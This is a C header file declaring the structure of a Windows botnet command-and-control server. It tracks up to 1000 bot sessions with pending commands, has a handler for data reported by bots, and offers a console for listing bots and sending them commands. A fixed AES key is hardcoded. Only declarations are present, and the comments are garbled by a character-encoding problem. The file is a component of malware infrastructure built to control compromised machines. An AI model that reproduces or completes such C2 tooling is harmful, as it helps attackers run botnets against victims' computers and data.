#ifndef C2_SERVER_H
#define C2_SERVER_H

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <process.h>
#include <jansson.h>
#include <conio.h>
#include <stdint.h>
#include "../comm/crypto.h"
#include "../comm/net_util.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "jansson.lib")

#define PORT 8443
#define CONFIG_FILE "c2_config.json"
#define MAX_BOTS 1000
#define BUFFER_SIZE 4096
#define BACKLOG 10
#define DEBUG_MODE 1
#define AES_KEY "2B7E151628AED2A6ABF7158809CF4F3C"

// ���������ýṹ
typedef struct {
    char *valid_ua;
    char *api_endpoint;
    char *aes_key; // ����
} ServerConfig;

// BOT �Ự�ṹ
typedef struct {
    char bot_id[64];
    char last_ip[46];
    time_t last_seen;
    char pending_command[512];  // �洢�����͸�bot������
    uint32_t persistent_id; // ��ӹ̶�ID
} BotSession;

// �ͻ����̲߳����ṹ
typedef struct {
    SOCKET client_socket;
    ServerConfig *config;
} ClientThreadArgs;

// ȫ�ֱ�������
extern BotSession bot_list[MAX_BOTS];
extern CRITICAL_SECTION bot_mutex;
extern ServerConfig *global_config;

// ��������
// ���ù���
ServerConfig *load_config(const char *filename);
void free_config(ServerConfig *cfg);

// ���繦��
void initialize_networking();
void cleanup_networking();
SOCKET create_listen_socket();
void start_server(SOCKET listen_socket);
unsigned __stdcall client_handler(void *arg);
unsigned __stdcall bot_cleaner(void *arg);

// BOT ����
void init_bot_manager();
void cleanup_bot_manager();
void update_bot_list(const char *bot_id, const char *ip);
char* get_query_param(const char *query, const char *param);
void handle_report_data(SOCKET client_socket, const char *headers, 
                       const char *body, size_t body_len);
void hex_dump(const char *data, size_t size);
char *find_body_start(const char *request);
int get_content_length(const char *headers);
char *get_header_value(const char *headers, const char *header_name);
unsigned __stdcall bot_cleaner_thread(void *arg);

// ����̨UI
void start_console_interface();
void show_bot_list();
void send_command_to_bot();



#endif // C2_SERVER_H